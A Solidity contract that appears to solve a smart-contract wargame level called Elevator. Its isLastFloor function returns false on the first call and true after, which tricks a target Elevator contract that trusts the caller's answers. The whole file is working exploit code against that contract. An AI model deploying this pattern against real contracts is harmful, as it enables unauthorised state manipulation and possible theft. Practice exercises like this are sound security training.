pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}


contract ExploitElevatorCorrect is Building {
    address public elevatorInstance;
    uint private callCount;

    constructor(address _instance) {
        elevatorInstance = _instance;
    }

    function isLastFloor(uint256) external returns (bool) {
        callCount++;
        return callCount != 1;
    }

    function attack() external {
        callCount = 0;
        IElevator(elevatorInstance).goTo(type(uint).max);
    }
}

interface IElevator {
    function goTo(uint256) external;
}